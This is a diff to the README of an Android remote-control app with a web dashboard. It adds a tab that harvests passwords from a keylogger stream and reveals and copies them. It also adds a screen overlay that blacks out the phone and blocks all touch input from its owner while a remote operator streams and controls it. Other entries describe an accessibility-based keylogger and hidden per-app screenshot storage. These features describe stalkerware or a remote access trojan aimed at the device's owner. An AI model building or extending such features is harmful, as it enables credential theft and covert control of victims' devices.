@@ -29,10 +29,12 @@ A two-component remote device management system:
 | `Sidebar.jsx` | Collapsible device list with online/offline status |
 | `StatusBar.jsx` | Server connection indicator |
 | `Overview.jsx` | Dashboard home with stats and activity log |
-| `DeviceControl.jsx` | Per-device control with 6 tabs |
+| `DeviceControl.jsx` | Per-device control with 12 tabs (added Task Studio + Passwords) |
+| `TaskStudio.jsx` | Workflow automation builder — create/save/run step sequences (Open App, Click Text, Paste Text, Close App, Delay); steps are reorderable, saveable to localStorage, with live run log |
+| `PasswordsTab.jsx` | Password capture tab — auto-detects password-like entries from keylogger push stream, reveals/hides values, copy to clipboard, sort by time or app |
 | `CommandPanel.jsx` | All remote commands organized into categories |
 | `ResultPanel.jsx` | Shows command results with image/audio rendering |
-| `ScreenControl.jsx` | Live stream in phone frame + Block Screen toggle + recording |
+| `ScreenControl.jsx` | Live stream in phone frame + Block Screen (stops stream + disables controls while blocked, prominent unblock button, dedicated unblock message) + recording |
 | `PermissionsTab.jsx` | Shows all app permissions (granted/denied), with per-permission request buttons + Special Permissions section (Battery, Overlay, Usage Stats, Write Settings) |
 | `ScreenReaderView.jsx` | Streaming UI tree viewer with visual phone frame overlay |
 | `KeyloggerTab.jsx` | Live keylog feed + per-day file download |
@@ -68,7 +70,7 @@ A two-component remote device management system:
 - **AppMonitor** — Per-monitored-app keylogs + screenshots stored offline under `.am/<pkg>/`; configured via `Constants.MONITORED_PACKAGES`
 - **UnifiedAccessibilityService** — Hooks `onTextChanged` and `onAppForeground` events to feed both KeyloggerService and AppMonitor
 - **SocketManager** — Routes all keylogger/app-monitor/app-manager commands; exposes `getKeylogger()` and `getAppMonitor()` accessors
-- **ScreenBlackout** — WindowManager TYPE_APPLICATION_OVERLAY overlay that blacks out the physical device screen; streaming briefly hides the overlay before each frame so the dashboard sees real content
+- **ScreenBlackout** — WindowManager TYPE_APPLICATION_OVERLAY overlay that blacks out the physical device screen; OnTouchListener consuming ALL touch events so device user cannot interact at all; race condition fixed with explicit locking and wait-for-attach/remove synchronization; streaming briefly hides the overlay before each frame so the dashboard sees real content (dashboard streaming disabled when block is active)
 - **PermissionManager** — Queries and requests all app runtime permissions; opens Settings for Accessibility, Overlay, or App Details as needed
 
 ## Android App Capabilities
